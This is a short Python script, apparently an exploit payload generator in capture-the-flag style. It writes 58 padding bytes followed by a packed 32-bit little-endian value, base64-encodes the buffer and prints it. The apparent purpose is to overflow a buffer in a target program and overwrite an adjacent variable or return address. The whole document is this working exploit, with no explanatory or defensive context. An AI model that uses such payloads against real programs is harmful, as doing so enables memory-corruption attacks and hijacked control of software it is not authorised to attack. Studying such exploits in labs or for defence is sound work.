
import sys
import struct
import base64

buf = b'wwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwww'
buf += struct.pack('<I', 2980359354)
buf = base64.b64encode(buf)
buf += b'\n'

sys.stdout.buffer.write(buf)
